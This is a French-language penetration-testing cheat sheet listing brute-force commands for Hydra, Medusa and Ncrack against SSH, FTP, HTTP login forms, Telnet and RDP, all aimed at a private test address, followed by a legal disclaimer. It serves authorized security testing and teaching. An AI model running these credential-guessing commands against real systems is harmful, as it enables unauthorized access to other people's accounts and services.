# Couche 4 (Transport) – Attaques et Outils

**Version Testée :**
- THC Hydra 9.x
- Medusa 2.x
- Ncrack 0.7.x

**Description :**  
Ce document recense les outils et attaques disponibles pour la couche Transport du modèle OSI.  
La couche 4 gère le transport des données via des protocoles tels que TCP et UDP.  
Les outils présentés permettent de mener des attaques de force brute sur divers protocoles (SSH, FTP, Telnet, RDP, etc.) ainsi que des tests d’authentification.  

---

### Outil: Hydra
**Description :**  
Hydra est un outil de force brute réseau rapide, supportant de nombreux protocoles tels que SSH, FTP, HTTP, etc.

#### Attaque: Bruteforce SSH
*Détails de l'attaque :*  
Utiliser Hydra pour tester une combinaison de login/mot de passe sur un service SSH.

###### Commande: Bruteforce SSH
```bash
hydra -l admin -P passlist.txt ssh://192.168.1.1
```
Détails :
- Login : admin  
- Wordlist : passlist.txt  
- Cible : 192.168.1.1

#### Attaque: Bruteforce FTP
*Détails de l'attaque :*  
Tester plusieurs combinaisons sur le service FTP pour obtenir un accès non autorisé.

###### Commande: Bruteforce FTP
```bash
hydra -L users.txt -P ftp_pass.txt ftp://192.168.1.1
```
Détails :
- Liste d’utilisateurs : users.txt  
- Wordlist FTP : ftp_pass.txt  
- Cible : 192.168.1.1

#### Attaque: Bruteforce HTTP POST
*Détails de l'attaque :*  
Tester des formulaires de connexion HTTP pour trouver les identifiants valides.

###### Commande: Bruteforce HTTP POST
```bash
hydra -l user -P rockyou.txt 192.168.1.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```
Détails :
- Test sur formulaire HTTP  
- Cible : 192.168.1.1

---

### Outil: Medusa
**Description :**  
Medusa est un brute-forcer parallèle pour les connexions réseau, permettant de tester rapidement de nombreux protocoles.

#### Attaque: Bruteforce Telnet
*Détails de l'attaque :*  
Utiliser Medusa pour forcer l’accès à un service Telnet via une attaque par dictionnaire.

###### Commande: Bruteforce Telnet
```bash
medusa -h 192.168.1.1 -u admin -P telnet_pass.txt -M telnet
```
Détails :
- Cible : 192.168.1.1  
- Nom d'utilisateur : admin  
- Wordlist : telnet_pass.txt

---

### Outil: Ncrack
**Description :**  
Ncrack est un outil de crack d'authentification réseau à grande vitesse, idéal pour tester la robustesse des services comme SSH ou RDP.

#### Attaque: Bruteforce RDP
*Détails de l'attaque :*  
Utiliser Ncrack pour tester les identifiants sur un service Remote Desktop Protocol.

###### Commande: Bruteforce RDP
```bash
ncrack -p 3389 192.168.1.1
```
Détails :
- Cible : 192.168.1.1  
- Port RDP : 3389

#### Attaque: Bruteforce SSH (alternative)
*Détails de l'attaque :*  
Tester les identifiants SSH en alternative à Hydra.

###### Commande: Bruteforce SSH avec Ncrack
```bash
ncrack -p 22 192.168.1.1
```
Détails :
- Cible : 192.168.1.1  
- Port SSH : 22

---

## Précautions Légales & Disclaimer
**Attention :**  
L'utilisation de ces outils et commandes doit être réalisée dans un cadre légal et exclusivement en environnement de test. Toute utilisation malveillante est strictement interdite.

---

## Références & Ressources
- [THC Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [Medusa GitHub](https://github.com/jmk-foofus/medusa)
- [Ncrack Official Website](https://nmap.org/ncrack/)
```